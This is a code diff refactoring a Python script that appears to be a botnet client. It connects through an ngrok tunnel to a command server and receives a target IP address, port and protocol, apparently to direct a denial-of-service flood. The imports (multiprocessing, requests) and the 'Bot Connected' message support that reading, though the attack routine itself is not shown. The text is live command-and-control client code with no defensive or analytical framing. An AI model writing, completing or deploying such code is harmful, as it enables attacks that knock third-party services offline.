@@ -6,27 +6,28 @@ import multiprocessing
 import requests
 import time
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_ip = "0.tcp.ap.ngrok.io"
-server_port = int(input("Enter Server Port:"))
-print("Bot Connected")
+#server_ip = "0.tcp.ap.ngrok.io"
+#server_port = int(input("Enter Server Port:"))
+SERVER_IP = "0.tcp.ap.ngrok.io"
+SERVER_PORT = int(input("Enter Server Port:"))
+ADDR = (SERVER_IP, SERVER_PORT)
+SIZE = 1024
+FORMAT = "utf-8"
 
-#Get ip
-s.connect((server_ip, server_port))
-hostname = s.recv(1024)
-ip = str(hostname.decode())
-s.close()
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#get ip
+s.connect((ADDR))
+hostname = s.recv(SIZE).decode(FORMAT)
+ip = str(hostname)
+
 #Get port
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((server_ip, server_port))
-hostport = s.recv(1024)
-port = int(hostport.decode())
-s.close()
+hostport = s.recv(SIZE).decode(FORMAT)
+port = int(hostport)
+
 #Get Protocol
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((server_ip, server_port))
-proto = s.recv(1024)
-protocol = str(proto.decode())
+proto = s.recv(SIZE).decode(FORMAT)
+protocol = str(proto)
+
 s.close()
 
 print(ip,":",port,":",protocol)
